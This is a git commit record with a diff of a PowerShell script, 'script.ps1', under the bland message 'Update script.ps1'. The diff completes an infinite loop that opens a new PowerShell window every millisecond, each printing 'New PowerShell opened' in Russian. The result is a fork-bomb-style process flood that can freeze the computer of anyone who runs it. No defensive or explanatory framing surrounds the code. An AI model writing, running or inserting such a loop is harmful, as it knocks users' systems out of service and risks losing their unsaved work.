6ba1f49ade4ebdf5ffe4668a4b3e9b1911c91dd0
GIIITSCR <aasdwasdawsd@gmail.com>
2025-08-30 00:52:37 +0400

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,3 +1,4 @@
 while ($true) {
     Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", "Write-Host 'Новый PowerShell открыт' -ForegroundColor Red"
     Start-Sleep -Milliseconds 1
+}
